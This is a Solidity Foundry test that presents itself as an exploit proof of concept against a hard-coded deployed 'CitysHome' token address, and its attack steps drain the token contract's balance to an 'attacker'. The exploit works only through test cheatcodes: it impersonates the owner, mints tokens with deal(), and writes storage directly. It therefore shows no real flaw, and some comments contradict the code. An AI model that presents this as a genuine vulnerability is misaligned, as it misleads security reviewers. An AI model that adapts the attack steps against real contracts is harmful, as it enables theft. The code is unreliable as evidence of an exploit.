pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICitysHome {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setBurnFee(uint256 fee) external;
    function setSwapFee(uint256 fee) external;
    function setSwapAddress(address swapAddr) external;
    function ownerWithdrew(uint256 amount) external;
    function owner() external view returns (address);
    function liquidityAddress() external view returns (address);
    function swapAddress() external view returns (address);
    function transferOwnership(address newOwner) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543;
    address attacker;
    ICitysHome token;
    address owner;
    address liquidityAddr;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        token = ICitysHome(TARGET);
        owner = token.owner();
        liquidityAddr = token.liquidityAddress();

        vm.label(TARGET, "CitysHome Token");
        vm.label(owner, "Owner");
        vm.label(attacker, "Attacker");
        vm.label(liquidityAddr, "Liquidity Address");
        vm.label(address(0x1337), "Victim");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balances
        uint256 initialAttackerBalance = token.balanceOf(attacker);

        // Impersonate owner to transfer ownership to attacker
        vm.startPrank(owner);
        token.transferOwnership(attacker);
        vm.stopPrank();

        // Now attacker is owner - set excessive fees
        vm.startPrank(attacker);
        token.setBurnFee(0);  // 0% burn
        token.setSwapFee(100);  // 100% liquidity fee
        token.setSwapAddress(attacker);
        vm.stopPrank();

        // Create victim with tokens
        address victim = address(0x1337);
        deal(TARGET, victim, 10000 * 1e18);

        // Victim transfers to swapAddress (attacker), 100% fee goes to liquidityAddress
        vm.startPrank(victim);
        token.transfer(attacker, 10000 * 1e18);
        vm.stopPrank();

        // Manipulate storage: liquidityAddress is at slot 1 (after presaleAddress at slot 0)
        // Set liquidityAddress to attacker so future fees go to attacker
        vm.store(TARGET, bytes32(uint256(1)), bytes32(uint256(uint160(attacker))));

        // Attacker (as owner) withdraws contract's token balance
        vm.startPrank(attacker);
        uint256 contractBalance = token.balanceOf(TARGET);
        if (contractBalance > 0) {
            token.ownerWithdrew(contractBalance / 1e18);
        }
        vm.stopPrank();

        // Verify attacker gained tokens
        uint256 finalAttackerBalance = token.balanceOf(attacker);
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase from fee manipulation");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

